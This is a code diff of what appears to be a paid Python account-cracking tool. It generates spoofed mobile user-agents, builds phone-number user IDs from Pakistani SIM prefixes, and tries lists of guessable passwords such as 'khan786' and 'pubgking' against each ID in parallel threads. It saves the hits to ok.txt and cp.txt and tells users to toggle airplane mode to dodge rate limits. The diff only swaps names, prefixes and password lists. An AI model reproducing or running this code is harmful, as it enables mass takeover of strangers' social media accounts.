@@ -40,23 +40,23 @@ ugen=[]
 for xd in range(10000):
     aa='Mozilla/5.0 (Linux; U; Android 11;'
     b=random.choice(['6','7','8','9','10','11','12'])
-    c='fr-fr; Redmi Note 11 Build/'
+    c='ru-ru; POCO X3 NFC Build/'
     d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
     e=random.randrange(1, 999)
     f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/'
+    g='Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.6.2-gn/'
     h=random.randrange(73,100)
     i='0'
     j=random.randrange(4200,4900)
     k=random.randrange(40,150)
-    l=' Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn'
+    l=' AppleWebKit/537.36 (KHTML, like Gecko) Version'
     uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
     ugen.append(uaku2)
 #Mozilla/5.0 (Linux; U; Android 11; fr-fr; Redmi Note 11 Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn
 #Mozilla/5.0 (Linux; Android 13; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36
     aa='Mozilla/5.0 (Linux; Android 13;'
     b=random.choice(['7.0','8.1.0','9','10','11','12'])
-    c=random.choice(['vivi y33'])
+    c=random.choice(['Redmi Note 10 Pro'])
     d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
     e=random.randrange(1, 999)
     f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -65,7 +65,7 @@ for xd in range(10000):
     i='0'
     j=random.randrange(4200,4900)
     k=random.randrange(40,150)
-    l='Chrome/113.0.5672.162 Mobile Safari/537.36'
+    l='Chrome/107.0.0.0 Mobile Safari/537.36'
     uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
     ugen.append(uaku2)
     
@@ -1099,7 +1099,7 @@ logo = """
 [•] AUTHOR     : \033[1;32mFK\033[1;37m
 [•] STATUS     : \033[1;32mPAID\033[1;37m
 --------------------------------------------------
-[•] \033[1;37mVERSION    :\033[1;32m 2.1.5 \033[1;37m"DON'T WORRY FOR UPDATES!"\033[1;37m
+[•] \033[1;37mVERSION    :\033[1;32m 1.0.4 \033[1;37m"DON'T WORRY FOR UPDATES!"\033[1;37m
 --------------------------------------------------"""
 
 def lines():
@@ -1157,8 +1157,8 @@ def menu():
 	os.system('clear')
 	print(logo)
 	print('[1] LAST 7 DIGIT')
-	print('[2] SAJJID + MALUK PASS')
-	print('[3] SALEEM + BALOCH PASS')
+	print('[2] ALI + KHAN PASS')
+	print('[3] MALIK + BALOCH PASS')
 	print('[4] BEST FOR PUBG IDS')
 	print('[5] BEST FOR FREE FIRE IDS')
 	print('[0] EXIT TO MAIN MENU')
@@ -1167,9 +1167,9 @@ def menu():
 	if opt =='1':
 		svn_digit()
 	elif opt =='2':
-		ali:sajid_maluk()
+		ali_khan()
 	elif opt =='3':
-		saleem_baloch()
+		malik_baloch()
 	elif opt =='4':
 		pubg()
 	elif opt =='5':
@@ -1187,7 +1187,7 @@ def svn_digit():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print('[•] EXAMPLE :0328,0316,0308,0306.ETC')
+	print('[•] EXAMPLE :92318,92345,92323,92306.ETC')
 	lines()
 	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
 	os.system('clear')
@@ -1222,7 +1222,7 @@ def ali_khan():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print('[•] EXAMPLE :0328,0316,0308,0306.ETC')
+	print('[•] EXAMPLE :92318,92345,92323,92306.ETC')
 	lines()
 	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
 	os.system('clear')
@@ -1239,12 +1239,12 @@ def ali_khan():
 		tl = str(len(user))
 		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
 		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
-		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32SAJJID + MALUK')
+		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mALI + KHAN')
 		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
 		lines()
 		for guru in user:
 			uid = kode+guru
-			pwx = [guru,'maluk123','maluk122','maluk312','malukmaluk','malukkhan']
+			pwx = [guru,'khankhan','khan1122','khan12','khan123','khan786']
 			yaari.submit(fcrack,uid,pwx,tl)
 	print('[✓] Crack process has been completed')
 	print('[?] Ids saved in ok.txt,cp.txt')
@@ -1263,7 +1263,7 @@ def malik_baloch():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print('[√] EXAMPLE :0318,0345,0323,0306.ETC')
+	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
 	lines()
 	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
 	os.system('clear')
@@ -1280,12 +1280,12 @@ def malik_baloch():
 		tl = str(len(user))
 		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
 		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
-		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mSAJAD + MALUK')
+		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mMALIK + BALOCH')
 		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
 		lines()
 		for guru in user:
 			uid = kode+guru
-			pwx = [guru,'sajad123','sjaad321','Sajad123']
+			pwx = [guru,'malik123','malik1122','baloch786']
 			yaari.submit(fcrack,uid,pwx,tl)
 	print('[✓] Crack process has been completed')
 	print('[?] Ids saved in ok.txt,cp.txt')
@@ -1298,7 +1298,7 @@ def pubg():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print('[√] EXAMPLE :0328,0316,0308,92306.ETC')
+	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
 	lines()
 	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
 	os.system('clear')
@@ -1320,7 +1320,7 @@ def pubg():
 		lines()
 		for guru in user:
 			uid = kode+guru
-			pwx = [guru,'pubgqueen123','pubgking123','pubglover112233']
+			pwx = [guru,'pubgqueen','pubgking','pubglover']
 			yaari.submit(fcrack,uid,pwx,tl)
 	print('[✓] Crack process has been completed')
 	print('[?] Idz saved in [ok.txt,cp.txt]')
@@ -1333,7 +1333,7 @@ def ff():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print('[√] EXAMPLE :0318,0316,0308,0306.ETC')
+	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
 	lines()
 	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
 	os.system('clear')
@@ -1355,7 +1355,7 @@ def ff():
 		lines()
 		for guru in user:
 			uid = kode+guru
-			pwx = [guru,'freefire123','fflover123','ffking123','ffqueen123']
+			pwx = [guru,'freefire','fflover','ffking','ffqueen']
 			yaari.submit(fcrack,uid,pwx,tl)
 	print('[✓] Crack process has been completed')
 	print('[?] Idz saved in [ok.txt,cp.txt]')
